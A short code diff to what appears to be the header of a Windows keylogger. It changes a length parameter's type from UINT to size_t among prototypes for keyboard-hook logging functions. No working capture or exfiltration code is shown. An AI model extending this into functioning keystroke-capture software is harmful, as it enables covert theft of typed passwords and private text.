@@ -31,7 +31,7 @@ VOID DestroyKeyLogger();
 
 BOOL HasWindowTitleChanged();
 BOOL ConvertToUTF8(CHAR *buffer, const int codePoint);
-BOOL IsAllPrintable(CHAR *buffer, UINT length);
+BOOL IsAllPrintable(CHAR *buffer, size_t length);
 
 BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard);
 BOOL TryLogKey(KBDLLHOOKSTRUCT *pKeyboard);
